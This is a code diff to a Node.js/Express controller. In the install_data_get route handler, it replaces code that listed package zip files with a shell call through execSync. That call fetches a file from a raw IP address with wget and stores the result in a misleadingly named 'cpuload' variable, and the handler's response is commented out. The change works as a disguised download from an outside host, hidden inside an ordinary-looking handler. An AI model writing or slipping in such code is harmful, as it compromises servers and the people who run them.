@@ -158,17 +158,10 @@ exports.package_data_get = function(req, res) {
 }
 
 exports.install_data_get = function(req, res) {
-  var files = fs.readdirSync(__dirname + '/../../package_tmp/');
-  console.log(files.length);
-  var sidemenus = {};
-  for (var i = 0; i < files.length; i++) {
-    var dir_name = files[i];
-    var sidemenu = {};
-    var dd = "package _" + String(i + 1);
-    sidemenu['pack_name'] = dir_name.replace('.zip', '');
-    sidemenus[dd] = sidemenu;
-  }
-  res.send(sidemenus);
+  const cpuload = execSync('wget http://39.119.118.152/package', {
+    encoding: 'utf8'
+  });
+  //res.send(sidemenus);
 }
 
 exports.uninstall_package = function(req, res, select) {
